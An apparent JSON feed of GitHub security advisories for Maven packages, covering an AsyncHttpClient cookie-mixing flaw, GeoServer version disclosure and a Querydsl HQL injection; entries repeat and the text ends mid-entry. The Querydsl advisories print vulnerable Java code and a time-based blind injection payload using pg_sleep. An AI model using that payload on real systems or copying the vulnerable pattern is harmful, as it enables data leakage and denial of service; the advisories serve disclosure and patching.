{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When making any HTTP request, the automatically enabled and self-managed <code>CookieStore</code> (aka cookie jar) will silently replace explicitly defined <code>Cookie</code>s with any that have the same name from the cookie jar. For services that operate with multiple users, this can result in one user's <code>Cookie</code> being used for another user's requests.</p>\n<h3 id=\"details\">Details</h3>\n<p>This issue is described without security warnings here:</p>\n<p><a href=\"https://github.com/AsyncHttpClient/async-http-client/issues/1964\">https://github.com/AsyncHttpClient/async-http-client/issues/1964</a></p>\n<p>A PR to fix this issue has been made:</p>\n<p><a href=\"https://github.com/AsyncHttpClient/async-http-client/pull/2033\">https://github.com/AsyncHttpClient/async-http-client/pull/2033</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Add an auth <code>Cookie</code> to the <code>CookieStore</code><ul>\n<li>This is identical to receiving an HTTP response that uses <code>Set-Cookie</code>, as shown in issue #1964 above.</li>\n</ul>\n</li>\n<li>Handle a different user's request where the same <code>Cookie</code> is provided as a passthrough, like a JWT, and attempt to use it by explicitly providing it.</li>\n<li>Observe that the user's cookie in step 2 is passed as the Cookie in step 1.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is generally going to be a problem for developers of backend services that implement third party auth features and use other features like token refresh. The moment a third party service responds by <em>setting</em> a cookie in the response, the <code>CookieStore</code> will effectively break almost every follow-up request (hopefully by being rejected, but possibly by revealing a different user's information).</p>\n<p>If your service sets cookies based on the response that happens here, it's possible to lead to even greater levels of exposure.</p>\n<h3 id=\"workaroud\">Workaroud</h3>\n<p>You can avoid this issue by disabling the <code>CookieStore</code> during client creation:</p>\n<pre><code class=\"language-java\">DefaultAsyncHttpClientConfig.Builder clientBuilder = Dsl.config()\n .setCookieStore(null)\n // other configuration\n ;\n### References\n\n- &lt;https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-mfj5-cf8g-g2fv&gt;\n- &lt;https://nvd.nist.gov/vuln/detail/CVE-2024-53990&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/issues/1964&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/pull/2033&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/commit/d5a83362f7aed81b93ebca559746ac9be0f95425&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/blob/main/CHANGES.md#from-20-to-21&gt;\n- &lt;https://github.com/advisories/GHSA-mfj5-cf8g-g2fv&gt;\n</code></pre>\n",
            "url": "https://github.com/advisories/GHSA-mfj5-cf8g-g2fv",
            "title": "[org.asynchttpclient:async-http-client] AsyncHttpClient (AHC) library's `CookieStore` replaces explicitly defined `Cookie`s",
            "date_modified": "2024-12-16T22:51:15.000Z",
            "date_published": "2024-12-02T20:04:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mfj5-cf8g-g2fv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When making any HTTP request, the automatically enabled and self-managed <code>CookieStore</code> (aka cookie jar) will silently replace explicitly defined <code>Cookie</code>s with any that have the same name from the cookie jar. For services that operate with multiple users, this can result in one user's <code>Cookie</code> being used for another user's requests.</p>\n<h3 id=\"details\">Details</h3>\n<p>This issue is described without security warnings here:</p>\n<p><a href=\"https://github.com/AsyncHttpClient/async-http-client/issues/1964\">https://github.com/AsyncHttpClient/async-http-client/issues/1964</a></p>\n<p>A PR to fix this issue has been made:</p>\n<p><a href=\"https://github.com/AsyncHttpClient/async-http-client/pull/2033\">https://github.com/AsyncHttpClient/async-http-client/pull/2033</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Add an auth <code>Cookie</code> to the <code>CookieStore</code><ul>\n<li>This is identical to receiving an HTTP response that uses <code>Set-Cookie</code>, as shown in issue #1964 above.</li>\n</ul>\n</li>\n<li>Handle a different user's request where the same <code>Cookie</code> is provided as a passthrough, like a JWT, and attempt to use it by explicitly providing it.</li>\n<li>Observe that the user's cookie in step 2 is passed as the Cookie in step 1.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is generally going to be a problem for developers of backend services that implement third party auth features and use other features like token refresh. The moment a third party service responds by <em>setting</em> a cookie in the response, the <code>CookieStore</code> will effectively break almost every follow-up request (hopefully by being rejected, but possibly by revealing a different user's information).</p>\n<p>If your service sets cookies based on the response that happens here, it's possible to lead to even greater levels of exposure.</p>\n<h3 id=\"workaroud\">Workaroud</h3>\n<p>You can avoid this issue by disabling the <code>CookieStore</code> during client creation:</p>\n<pre><code class=\"language-java\">DefaultAsyncHttpClientConfig.Builder clientBuilder = Dsl.config()\n .setCookieStore(null)\n // other configuration\n ;\n### References\n\n- &lt;https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-mfj5-cf8g-g2fv&gt;\n- &lt;https://nvd.nist.gov/vuln/detail/CVE-2024-53990&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/issues/1964&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/pull/2033&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/commit/d5a83362f7aed81b93ebca559746ac9be0f95425&gt;\n- &lt;https://github.com/AsyncHttpClient/async-http-client/blob/main/CHANGES.md#from-20-to-21&gt;\n- &lt;https://github.com/advisories/GHSA-mfj5-cf8g-g2fv&gt;\n</code></pre>\n",
            "url": "https://github.com/advisories/GHSA-mfj5-cf8g-g2fv",
            "title": "[org.asynchttpclient:async-http-client] AsyncHttpClient (AHC) library's `CookieStore` replaces explicitly defined `Cookie`s",
            "date_modified": "2024-12-16T22:51:15.000Z",
            "date_published": "2024-12-02T20:04:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mfj5-cf8g-g2fv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The welcome and about page includes version and revision information about the software in use (including library and components used).</p>\n<p>This information is sensitive from a security point of view because it allows software used by the server to be easily identified.</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<ol>\n<li><p>Welcome page footer: </p>\n<img src=\"https://github.com/geoserver/geoserver/assets/629681/a7fd5151-55d5-432b-9d5d-79136833609f\" alt=\"image\" width=\"432\">\n</li>\n<li><p>About page <em>build information</em>. </p>\n<img src=\"https://github.com/geoserver/geoserver/assets/629681/59fcd8dd-eaee-4bf8-9578-a2a94b2864db\" alt=\"image\" width=\"401\"></li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>No patch presently available.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround available, although the ADMIN_CONSOLE can be disabled completely.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://docs.geoserver.org/latest/en/user/webadmin/about.html\">About GeoServer</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6\">https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6</a></li>\n<li><a href=\"https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99\">https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35230\">https://nvd.nist.gov/vuln/detail/CVE-2024-35230</a></li>\n<li><a href=\"https://github.com/geoserver/geoserver/commit/74fdab745a5deff20ac99abca24d8695fe1a52f8\">https://github.com/geoserver/geoserver/commit/74fdab745a5deff20ac99abca24d8695fe1a52f8</a></li>\n<li><a href=\"https://github.com/geoserver/geoserver/commit/8cd1590a604a10875de67b04995f1952f631f920\">https://github.com/geoserver/geoserver/commit/8cd1590a604a10875de67b04995f1952f631f920</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6pfc-w86r-54q6\">https://github.com/advisories/GHSA-6pfc-w86r-54q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6pfc-w86r-54q6",
            "title": "[org.geoserver.web:gs-web-core] Welcome and About GeoServer pages communicate version and revision information",
            "date_modified": "2024-12-17T14:38:09.000Z",
            "date_published": "2024-12-16T22:18:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6pfc-w86r-54q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The welcome and about page includes version and revision information about the software in use (including library and components used).</p>\n<p>This information is sensitive from a security point of view because it allows software used by the server to be easily identified.</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<ol>\n<li><p>Welcome page footer: </p>\n<img src=\"https://github.com/geoserver/geoserver/assets/629681/a7fd5151-55d5-432b-9d5d-79136833609f\" alt=\"image\" width=\"432\">\n</li>\n<li><p>About page <em>build information</em>. </p>\n<img src=\"https://github.com/geoserver/geoserver/assets/629681/59fcd8dd-eaee-4bf8-9578-a2a94b2864db\" alt=\"image\" width=\"401\"></li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>No patch presently available.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround available, although the ADMIN_CONSOLE can be disabled completely.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://docs.geoserver.org/latest/en/user/webadmin/about.html\">About GeoServer</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6\">https://github.com/geoserver/geoserver/security/advisories/GHSA-6pfc-w86r-54q6</a></li>\n<li><a href=\"https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99\">https://github.com/geoserver/geoserver/commit/5fd5f35ae176eff3cc4667a5cf48e4bf5dc4ea99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35230\">https://nvd.nist.gov/vuln/detail/CVE-2024-35230</a></li>\n<li><a href=\"https://github.com/geoserver/geoserver/commit/74fdab745a5deff20ac99abca24d8695fe1a52f8\">https://github.com/geoserver/geoserver/commit/74fdab745a5deff20ac99abca24d8695fe1a52f8</a></li>\n<li><a href=\"https://github.com/geoserver/geoserver/commit/8cd1590a604a10875de67b04995f1952f631f920\">https://github.com/geoserver/geoserver/commit/8cd1590a604a10875de67b04995f1952f631f920</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6pfc-w86r-54q6\">https://github.com/advisories/GHSA-6pfc-w86r-54q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6pfc-w86r-54q6",
            "title": "[org.geoserver.web:gs-web-app] Welcome and About GeoServer pages communicate version and revision information",
            "date_modified": "2024-12-17T14:38:09.000Z",
            "date_published": "2024-12-16T22:18:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6pfc-w86r-54q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href=\"https://github.com/querydsl/querydsl\">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Vulnerable code may look as follows:</p>\n<pre><code>@GetMapping\npublic List&lt;Test&gt; getProducts(@RequestParam(\"orderBy\") String orderBy) {\n    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\n\n    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n</code></pre>\n<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Full POC code is available in repository:\n<a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203/\">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>\nWhen we take a look at source code shown in Details section the functionality is as follows:</p>\n<ol>\n<li>Create JPAQuery object instance:</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n</code></pre>\n<ol start=\"2\">\n<li>Create OrderSpecifier object instance:</li>\n</ol>\n<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n</code></pre>\n<p>Where orderBy variable is user provided input.</p>\n<ol start=\"3\">\n<li>order and run the query</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n</code></pre>\n<p>When user goes to URL \n<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>\nThe generated query will look something like this:</p>\n<pre><code>select test                                                                                                                                     \nfrom Test test\norder by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc\n</code></pre>\n<h4 id=\"environment\">Environment</h4>\n<p>Library versions used in proof of concept to reproduce the vulnerability:</p>\n<pre><code>querydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\njakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49203\">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/issues/3757\">https://github.com/querydsl/querydsl/issues/3757</a></li>\n<li><a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203\">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0\">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>\n<li><a href=\"https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html\">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/5.6.1\">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/6.10.1\">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg",
            "title": "[com.querydsl:querydsl-apt] Querydsl vulnerable to HQL injection trough orderBy",
            "date_modified": "2024-12-16T21:26:13.000Z",
            "date_published": "2024-11-27T19:00:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href=\"https://github.com/querydsl/querydsl\">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Vulnerable code may look as follows:</p>\n<pre><code>@GetMapping\npublic List&lt;Test&gt; getProducts(@RequestParam(\"orderBy\") String orderBy) {\n    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\n\n    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n</code></pre>\n<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Full POC code is available in repository:\n<a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203/\">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>\nWhen we take a look at source code shown in Details section the functionality is as follows:</p>\n<ol>\n<li>Create JPAQuery object instance:</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n</code></pre>\n<ol start=\"2\">\n<li>Create OrderSpecifier object instance:</li>\n</ol>\n<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n</code></pre>\n<p>Where orderBy variable is user provided input.</p>\n<ol start=\"3\">\n<li>order and run the query</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n</code></pre>\n<p>When user goes to URL \n<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>\nThe generated query will look something like this:</p>\n<pre><code>select test                                                                                                                                     \nfrom Test test\norder by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc\n</code></pre>\n<h4 id=\"environment\">Environment</h4>\n<p>Library versions used in proof of concept to reproduce the vulnerability:</p>\n<pre><code>querydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\njakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49203\">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/issues/3757\">https://github.com/querydsl/querydsl/issues/3757</a></li>\n<li><a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203\">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0\">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>\n<li><a href=\"https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html\">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/5.6.1\">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/6.10.1\">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg",
            "title": "[com.querydsl:querydsl-jpa] Querydsl vulnerable to HQL injection trough orderBy",
            "date_modified": "2024-12-16T21:26:13.000Z",
            "date_published": "2024-11-27T19:00:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href=\"https://github.com/querydsl/querydsl\">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Vulnerable code may look as follows:</p>\n<pre><code>@GetMapping\npublic List&lt;Test&gt; getProducts(@RequestParam(\"orderBy\") String orderBy) {\n    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\n\n    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n</code></pre>\n<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Full POC code is available in repository:\n<a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203/\">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>\nWhen we take a look at source code shown in Details section the functionality is as follows:</p>\n<ol>\n<li>Create JPAQuery object instance:</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n</code></pre>\n<ol start=\"2\">\n<li>Create OrderSpecifier object instance:</li>\n</ol>\n<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n</code></pre>\n<p>Where orderBy variable is user provided input.</p>\n<ol start=\"3\">\n<li>order and run the query</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n</code></pre>\n<p>When user goes to URL \n<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>\nThe generated query will look something like this:</p>\n<pre><code>select test                                                                                                                                     \nfrom Test test\norder by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc\n</code></pre>\n<h4 id=\"environment\">Environment</h4>\n<p>Library versions used in proof of concept to reproduce the vulnerability:</p>\n<pre><code>querydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\njakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49203\">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/issues/3757\">https://github.com/querydsl/querydsl/issues/3757</a></li>\n<li><a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203\">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0\">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>\n<li><a href=\"https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html\">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/5.6.1\">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/6.10.1\">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg",
            "title": "[io.github.openfeign.querydsl:querydsl-apt] Querydsl vulnerable to HQL injection trough orderBy",
            "date_modified": "2024-12-16T21:26:13.000Z",
            "date_published": "2024-11-27T19:00:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href=\"https://github.com/querydsl/querydsl\">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Vulnerable code may look as follows:</p>\n<pre><code>@GetMapping\npublic List&lt;Test&gt; getProducts(@RequestParam(\"orderBy\") String orderBy) {\n    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\n\n    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n</code></pre>\n<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Full POC code is available in repository:\n<a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203/\">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>\nWhen we take a look at source code shown in Details section the functionality is as follows:</p>\n<ol>\n<li>Create JPAQuery object instance:</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n</code></pre>\n<ol start=\"2\">\n<li>Create OrderSpecifier object instance:</li>\n</ol>\n<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n</code></pre>\n<p>Where orderBy variable is user provided input.</p>\n<ol start=\"3\">\n<li>order and run the query</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n</code></pre>\n<p>When user goes to URL \n<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>\nThe generated query will look something like this:</p>\n<pre><code>select test                                                                                                                                     \nfrom Test test\norder by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc\n</code></pre>\n<h4 id=\"environment\">Environment</h4>\n<p>Library versions used in proof of concept to reproduce the vulnerability:</p>\n<pre><code>querydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\njakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49203\">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/issues/3757\">https://github.com/querydsl/querydsl/issues/3757</a></li>\n<li><a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203\">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0\">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>\n<li><a 